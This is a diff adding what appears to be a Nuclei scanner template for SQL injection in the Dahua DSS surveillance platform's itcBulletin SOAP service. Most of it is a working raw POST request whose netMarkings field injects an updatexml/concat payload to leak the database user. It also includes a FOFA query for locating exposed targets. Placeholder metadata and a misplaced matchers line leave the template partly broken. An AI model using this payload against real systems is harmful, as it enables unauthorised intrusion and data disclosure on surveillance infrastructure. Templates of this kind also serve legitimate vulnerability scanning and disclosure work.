@@ -1,0 +1,40 @@
+
+id: dahua-dds-itcBulletin-sqli
+
+info:
+  name: 大华 DSS 数字监控系统 itcBulletin SQL 注入
+  author: changge
+  severity: high
+  description: description
+  metadata:
+    max-request: 1
+    fofa-query: body="<meta http-equiv=\"refresh\" content=\"1;url='/admin'\"></span>" || body="dahuaDefined/headCommon.js" || title=="DSS"
+    verified: true
+  reference:
+    - https://
+  tags: tags
+
+requests:
+  - raw:
+      - |-
+        POST /portal/services/itcBulletin?wsdl HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Length: 335
+
+        <s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
+          <s11:Body>
+            <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
+              <netMarkings>
+                (updatexml(1,concat(0x7e,user(),0x7e),1))) and (1=1
+              </netMarkings>
+            </ns1:deleteBulletin>
+          </s11:Body>
+        </s11:Envelope>
+            matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'soap'
